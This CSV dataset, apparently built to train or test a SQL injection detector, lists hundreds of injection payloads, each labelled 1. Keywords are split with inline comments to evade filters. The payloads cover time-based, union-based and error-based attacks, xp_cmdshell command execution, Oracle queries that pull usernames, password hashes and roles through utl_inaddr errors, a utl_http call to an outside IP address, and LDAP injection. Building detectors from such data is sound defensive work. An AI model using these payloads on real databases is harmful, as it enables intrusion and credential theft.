Query,Label
1   )    )     )   rl/**/ike sleep  (  5  )  #,1
"  (  se/**/lect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   ",1
"-1504""  )   as wpes whe/**/re 6256  =  6256 union all sele/**/ct 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1
1  )   wh/**/ere 9683  =  9683,1
1%'   )    )     )   o/**/r   (  s/**/elect * fro/**/m   (  se/**/lect  (  sleep  (  5   )    )     )  sddo  )  #,1
1  )   union all selec/**/t n/**/ull--,1
"1'  )   a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"1 w/**/here 6040  =  6040 a/**/nd 9660  =    (  selec/**/t count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-4954%""  )   o/**/r 5244  =  4832",1
"1""  )   rli/**/ke   (  selec/**/t * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  sgvo  )   an/**/d   (  ""fkmh""  =  ""fkmh",1
-8045   )    )     )   o/**/rd/**/er b/**/y 1--,1
"1'  )   whe/**/re 4786  =  4786 o/**/r   (  s/**/elect 2*  (  if   (    (   selec/**/t * fro/**/m   (  se/**/lect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%"" o/**/rder b/**/y 1--",1
1'||  (  sel/**/ect 'qtep' wh/**/ere 2572  =  2572 o/**/r   (  s/**/elect * f/**/rom   (  sel/**/ect  (  sleep  (  5   )    )     )  sddo  )  #,1
1  )   as zmxb whe/**/re 8424  =  8424 a/**/nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1"" union all selec/**/t nul/**/l,nul/**/l,nu/**/ll,n/**/ull,nul/**/l,n/**/ull,nu/**/ll--",1
"1   )    )    as queb wher/**/e 2449  =  2449 union all sel/**/ect nu/**/ll,nul/**/l#",1
"1'   )    )     )    (  selec/**/t   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fro/**/m i/**/nfo/**/rmation_schema.system_users  )   a/**/nd    (    (     (  'javh'  =  'javh",1
1'  )   wh/**/ere 8167  =  8167,1
"1'   )    )    as hmyc whe/**/re 6732  =  6732 a/**/nd exp  (  ~  (  selec/**/t * f/**/rom   (  selec/**/t concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"-9150%'   )    )     )   union all se/**/lect 7057,7057,7057,7057,7057,7057,7057,7057--",1
"1""   )    )     )   rli/**/ke   (  selec/**/t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    an/**/d    (    (     (  ""asvy""  =  ""asvy",1
"1""   )    )     )  ",1
"-6760 o/**/r 1570  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1
"1',iif  (  6625  =  6625,1,1/0  )  ",1
"selec/**/t count  (  *  )   fr/**/om generate_series  (  1,5000000  )   a/**/nd    (    (   'jloi'  =  'jloi",1
"1""   )    )    as hace w/**/here 8785  =  8785",1
1%'  )   an/**/d 8734  =  5844,1
1 rl/**/ike sleep  (  5  ) ,1
"1""  )   as jmwr wher/**/e 5978  =  5978 rli/**/ke   (  sel/**/ect   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1
"-9133""   )    )    o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   ""crfy""  =  ""crfy",1
1'+  (  selec/**/t ntym w/**/here 4750  =  4750,1
"1""   )    )     )   an/**/d 3707  =    (  se/**/lect count  (  *  )   f/**/rom sysibm.systab/**/les as t1,sysibm.systabl/**/es as t2,sysibm.syst/**/ables as t3  )   an/**/d    (    (     (  ""jgoq""  =  ""jgoq",1
"1' wh/**/ere 9116  =  9116 an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-5089'   )    )    as icbb wher/**/e 1129  =  1129 o/**/r 6250  =  9650,1
"-5703'  )   o/**/r elt  (  2972  =  8708,8708  )  ",1
"-6851'  )   o/**/r 1570  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d   (  'csfx'  =  'csfx",1
"1""  )   whe/**/re 8153  =  8153",1
1'   )    )     )   a/**/nd sleep  (  5  )   an/**/d    (    (     (  'vbck' li/**/ke 'vbck,1
1  )   wh/**/ere 2918  =  2918 an/**/d 7533  =  7533--,1
"-8609%""   )    )     )   union all selec/**/t 6021,6021,6021,6021,6021,6021--",1
"s/**/elect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    an/**/d    (    (   'fegp'  =  'fegp",1
"1%"" o/**/r   (  selec/**/t * fr/**/om   (  sele/**/ct  (  sleep  (  5   )    )     )  ydpu  )   a/**/nd ""%""  =  """,1
"1""  )   a/**/nd 8514  =    (  sel/**/ect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )   an/**/d   (  ""fpqh""  =  ""fpqh",1
"1   )    )    as rwsn whe/**/re 9946  =  9946 o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1'+  (  s/**/elect wjpc whe/**/re 5943  =  5943 an/**/d make_s/**/et  (  8403  =  8403,8899   )    )   +'",1
"1%'   )    )     (  sele/**/ct   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  v/**/alues  (  0   )    )     )   a/**/nd    (    (   '%'  =  '",1
-9456%'   )    )     )   o/**/rde/**/r b/**/y 1#,1
a,1
a',1
@,1
1'1,1
1\'1,1
 (  ||6  ) ,1
admi/**/n' o/**/r ',1
 o/**/r 'somethi/**/ng'   =   'some'+'thi/**/ng',1
 o/**/r 'whatever' i/**/n   (  'whatever'  ) ,1
grant connect to name; grant resource to name;,1
&1c,1
 (  s,1
 )  s,1
1s,1
;s,1
?s,1
UE1,1
UEs,1
UEv,1
c,1
n,1
ns,1
os,1
v,1
{s,1
-',1
*',1
""" """,1
"admi/**/n"" --",1
0,1
hi o/**/r a  =  a,1
ha/**/ndler,1
to_timestamp_tz,1
tz_offs/**/et,1
%7C,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
28%,1
29%,1
&,1
26%,1
 ,1
//,1
*/*,1
21%,1
3.10E+17,1
26%,1
0x77616974666F722064656C61792027303A303A313027 ...,1
â o/**/r 1  =  1 --,1
o/**/r 'x'  =  'x,1
29%,1
28%,1
o/**/r 3  =  3 --,1
a,1
a' ,1
a' --,1
a' o/**/r 1 = 1; --,1
@,1
?,1
' a/**/nd 1 = 0 )  union all,1
? o/**/r 1 = 1 --,1
x' a/**/nd userid i/**/s N/**/ULL; --,1
x' an/**/d email i/**/s N/**/ULL; --,1
anythi/**/ng' o/**/r 'x' = 'x,1
x' an/**/d 1 =  ( sele/**/ct count ( * )  fr/**/om tabname ) ; --,1
x' an/**/d members.email i/**/s NU/**/LL; --,1
x' o/**/r full_name li/**/ke '%bob%,1
23 o/**/r 1 = 1; --,1
'; exec master..xp_cmdshell 'pi/**/ng 172.10.1.255'--,1
a,1
1 o/**/r 1 = 1,1
1' o/**/r '1' = '1,1
1 an/**/d user_name (  )   =  'dbo',1
1,1
1'1,1
1 exec sp_  ( o/**/r exec xp_ ) ,1
1 an/**/d 1 = 1,1
1' an/**/d 1 =  ( selec/**/t count ( * )  fr/**/om tabl/**/enames ) ; --,1
1,1
1 an/**/d user_name (  )   =  'dbo',1
\'; de/**/sc users; --,1
1\'1,1
1' an/**/d non_exi/**/stant_tab/**/le  =  '1,1
' o/**/r username i/**/s no/**/t NUL/**/L o/**/r username  =  ',1
"1 a/**/nd a/**/scii ( lower ( substri/**/ng  (  (  sele/**/ct top 1 name fro/**/m sysobjects w/**/here xtype = 'u' ) , 1, 1  )  )   )  > 116",1
"1 union all sel/**/ect 1,2,3,4,5,6,name fr/**/om sysobjects wher/**/e xtype  =  'u' --",1
1 uni/**/on sel/**/ect all fro/**/m whe/**/re,1
’ o/**/r ‘1’ = ’1,1
' o/**/r '1' = '1,1
'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1
"' || myappadmi/**/n.adduser ( 'admi/**/n', 'newpass' )  || '",1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T banner F/**/ROM v$version WH/**/ERE ROWNUM = 1  )  )   A/**/ND 'i' = 'i,1
' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT SYS.LOGI/**/N_USER FRO/**/M DUAL  )  )   AN/**/D 'i' = 'i,1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT SYS.DA/**/TABASE_NAME FRO/**/M DUAL  )  )   A/**/ND 'i' = 'i,1
' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT host_name FR/**/OM v$i/**/nstance  )  )   AN/**/D 'i' = 'i,1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT global_name FRO/**/M global_name  )  )   AN/**/D 'i' = 'i,1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT COUNT ( DI/**/STI/**/NCT ( USERNAME  )  )   FRO/**/M SYS.ALL_USERS  )  )   AN/**/D 'i' = 'i,1
' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT COUNT ( DI/**/STI/**/NCT ( PASSWO/**/RD  )  )   FRO/**/M SYS.USER$  )  )   A/**/ND 'i' = 'i,1
' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT COUNT ( DI/**/STI/**/NCT ( ta/**/ble_name  )  )   F/**/ROM sys.all_t/**/ables  )  )   A/**/ND 'i' = 'i,1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT COUNT ( DI/**/STI/**/NCT ( column_name  )  )   F/**/ROM sys.all_tab_columns  )  )   AN/**/D 'i' = 'i,1
' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT COUNT ( DI/**/STI/**/NCT ( GRANTED_ROLE  )  )   FRO/**/M DBA_ROLE_PRIVS WH/**/ERE GRANTEE = SYS.LOGI/**/N_USER  )  )   AN/**/D 'i' = 'i,1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( USERNAME )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS LI/**/MIT FR/**/OM SYS.ALL_USERS )  WHE/**/RE LIM/**/IT = 1  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD )  FR/**/OM  ( SELEC/**/T DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LIM/**/IT FRO/**/M SYS.USER$ )  WHER/**/E L/**/IMIT = 1  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( t/**/able_name )  F/**/ROM  ( SEL/**/ECT DI/**/STI/**/NCT ( tabl/**/e_name ) , ROWNUM AS LIMI/**/T FR/**/OM sys.all_t/**/ables )  WHER/**/E LIMI/**/T = 1  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT DI/**/STI/**/NCT ( column_name )  FRO/**/M  ( S/**/ELECT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LIMI/**/T FRO/**/M all_tab_columns )  WH/**/ERE LI/**/MIT = 1  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( granted_role )  FRO/**/M  ( SE/**/LECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS L/**/IMIT F/**/ROM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WH/**/ERE LI/**/MIT = 1  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT DI/**/STI/**/NCT ( USERNAME )  F/**/ROM  ( SELE/**/CT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS LIMI/**/T FRO/**/M SYS.ALL_USERS )  W/**/HERE L/**/IMIT = 2  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD )  FRO/**/M  ( SEL/**/ECT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LIMI/**/T F/**/ROM SYS.USER$ )  WHE/**/RE LIM/**/IT = 2  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( tab/**/le_name )  FR/**/OM  ( SELEC/**/T DI/**/STI/**/NCT ( tab/**/le_name ) , ROWNUM AS LI/**/MIT FR/**/OM sys.all_t/**/ables )  W/**/HERE LI/**/MIT = 2  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT DI/**/STI/**/NCT ( column_name )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LIM/**/IT F/**/ROM all_tab_columns )  W/**/HERE L/**/IMIT = 2  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SEL/**/ECT DI/**/STI/**/NCT ( granted_role )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS L/**/IMIT FR/**/OM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WHER/**/E LIMI/**/T = 2  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SEL/**/ECT DI/**/STI/**/NCT ( USERNAME )  FRO/**/M  ( S/**/ELECT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS L/**/IMIT FR/**/OM SYS.ALL_USERS )  WHE/**/RE LI/**/MIT = 3  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD )  F/**/ROM  ( SELE/**/CT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS L/**/IMIT FRO/**/M SYS.USER$ )  WHE/**/RE LIMI/**/T = 3  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( tab/**/le_name )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( tab/**/le_name ) , ROWNUM AS L/**/IMIT FR/**/OM sys.all_tab/**/les )  WHER/**/E LI/**/MIT = 3  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SEL/**/ECT DI/**/STI/**/NCT ( column_name )  F/**/ROM  ( SELE/**/CT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LI/**/MIT FR/**/OM all_tab_columns )  WH/**/ERE LIM/**/IT = 3  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( granted_role )  FR/**/OM  ( S/**/ELECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS LIM/**/IT FR/**/OM dba_role_privs WHER/**/E GRANTEE = SYS.LOGI/**/NUSER )  W/**/HERE L/**/IMIT = 3  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( USERNAME )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS LIMI/**/T FRO/**/M SYS.ALL_USERS )  WHER/**/E LIMI/**/T = 4  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( PASSWO/**/RD )  FR/**/OM  ( SELE/**/CT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LI/**/MIT FR/**/OM SYS.USER$ )  WHE/**/RE LI/**/MIT = 4  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT DI/**/STI/**/NCT ( t/**/able_name )  FRO/**/M  ( SEL/**/ECT DI/**/STI/**/NCT ( t/**/able_name ) , ROWNUM AS LIM/**/IT FR/**/OM sys.all_t/**/ables )  WH/**/ERE L/**/IMIT = 4  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT DI/**/STI/**/NCT ( column_name )  F/**/ROM  ( SELEC/**/T DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LI/**/MIT FR/**/OM all_tab_columns )  WHER/**/E LIMI/**/T = 4  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( granted_role )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS LIM/**/IT FR/**/OM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WHE/**/RE LIMI/**/T = 4  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SEL/**/ECT DI/**/STI/**/NCT ( USERNAME )  FRO/**/M  ( SELE/**/CT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS LIM/**/IT FRO/**/M SYS.ALL_USERS )  WH/**/ERE LI/**/MIT = 5  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD )  FRO/**/M  ( S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LI/**/MIT F/**/ROM SYS.USER$ )  WHE/**/RE LIM/**/IT = 5  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SEL/**/ECT DI/**/STI/**/NCT ( tabl/**/e_name )  FRO/**/M  ( SE/**/LECT DI/**/STI/**/NCT ( tabl/**/e_name ) , ROWNUM AS LIMI/**/T FRO/**/M sys.all_tab/**/les )  W/**/HERE LIM/**/IT = 5  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( column_name )  FRO/**/M  ( SELE/**/CT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns )  W/**/HERE LIMI/**/T = 5  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( granted_role )  FRO/**/M  ( SELEC/**/T DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS LIMI/**/T F/**/ROM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WHE/**/RE LIMI/**/T = 5  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT DI/**/STI/**/NCT ( USERNAME )  FRO/**/M  ( SEL/**/ECT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS L/**/IMIT FRO/**/M SYS.ALL_USERS )  W/**/HERE LIMI/**/T = 6  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( PASSWO/**/RD )  FRO/**/M  ( SE/**/LECT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS L/**/IMIT FR/**/OM SYS.USER$ )  WH/**/ERE L/**/IMIT = 6  )  )   AN/**/D 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( ta/**/ble_name )  FRO/**/M  ( S/**/ELECT DI/**/STI/**/NCT ( ta/**/ble_name ) , ROWNUM AS LIMI/**/T FR/**/OM sys.all_ta/**/bles )  WH/**/ERE LIM/**/IT = 6  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT DI/**/STI/**/NCT ( column_name )  FR/**/OM  ( SELEC/**/T DI/**/STI/**/NCT ( column_name ) , ROWNUM AS L/**/IMIT FR/**/OM all_tab_columns )  WHE/**/RE LIMI/**/T = 6  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( granted_role )  FRO/**/M  ( SEL/**/ECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS LI/**/MIT F/**/ROM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WHER/**/E L/**/IMIT = 6  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( USERNAME )  FRO/**/M  ( S/**/ELECT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS L/**/IMIT FR/**/OM SYS.ALL_USERS )  WHE/**/RE LIM/**/IT = 7  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( PASSWO/**/RD )  FR/**/OM  ( SELEC/**/T DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LIMI/**/T F/**/ROM SYS.USER$ )  WHE/**/RE LIMI/**/T = 7  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELE/**/CT DI/**/STI/**/NCT ( t/**/able_name )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( tabl/**/e_name ) , ROWNUM AS LIMI/**/T F/**/ROM sys.all_ta/**/bles )  WHER/**/E L/**/IMIT = 7  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( column_name )  FRO/**/M  ( SELE/**/CT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LI/**/MIT F/**/ROM all_tab_columns )  WHE/**/RE L/**/IMIT = 7  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SELEC/**/T DI/**/STI/**/NCT ( granted_role )  FR/**/OM  ( SEL/**/ECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS LI/**/MIT F/**/ROM dba_role_privs WH/**/ERE GRANTEE = SYS.LOGI/**/NUSER )  WHE/**/RE LIMI/**/T = 7  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT DI/**/STI/**/NCT ( USERNAME )  F/**/ROM  ( SELE/**/CT DI/**/STI/**/NCT ( USERNAME ) , ROWNUM AS L/**/IMIT FRO/**/M SYS.ALL_USERS )  W/**/HERE LIM/**/IT = 8  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  SE/**/LECT DI/**/STI/**/NCT ( PASSWO/**/RD )  FRO/**/M  ( SELE/**/CT DI/**/STI/**/NCT ( PASSWO/**/RD ) , ROWNUM AS LIM/**/IT FRO/**/M SYS.USER$ )  W/**/HERE LI/**/MIT = 8  )  )   AN/**/D 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( ta/**/ble_name )  F/**/ROM  ( SELE/**/CT DI/**/STI/**/NCT ( ta/**/ble_name ) , ROWNUM AS LIMI/**/T F/**/ROM sys.all_t/**/ables )  WHE/**/RE LIMI/**/T = 8  )  )   A/**/ND 'i' = 'i",1
"' A/**/ND 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( column_name )  FRO/**/M  ( SE/**/LECT DI/**/STI/**/NCT ( column_name ) , ROWNUM AS LIMI/**/T F/**/ROM all_tab_columns )  W/**/HERE LIM/**/IT = 8  )  )   A/**/ND 'i' = 'i",1
"' AN/**/D 1 = utl_i/**/naddr.get_host_address  (  (  S/**/ELECT DI/**/STI/**/NCT ( granted_role )  F/**/ROM  ( S/**/ELECT DI/**/STI/**/NCT ( granted_role ) , ROWNUM AS L/**/IMIT FRO/**/M dba_role_privs WHER/**/E GRANTEE = SYS.LOGI/**/NUSER )  WHER/**/E LIM/**/IT = 8  )  )   AN/**/D 'i' = 'i",1
"'|| ( elt ( -3+5,bi/**/n ( 15 ) ,o/**/rd ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
||6,1
'||'6,1
 ( ||6 ) ,1
' o/**/r 1 = 1-- ,1
o/**/r 1 = 1,1
' o/**/r '1' = '1,1
; o/**/r '1' = '1',1
""" o/**/r i/**/sNU/**/LL ( 1/0 )  /*",1
' o/**/r '7659' = '7659,1
""" o/**/r i/**/sNUL/**/L ( 1/0 )  /*",1
' -- ,1
' o/**/r 1 = 1--,1
""" o/**/r 1 = 1--",1
' o/**/r 1 = 1 /*,1
o/**/r 1 = 1--,1
' o/**/r 'a' = 'a,1
""" o/**/r ""a"" = ""a",1
' )  o/**/r  ( 'a' = 'a,1
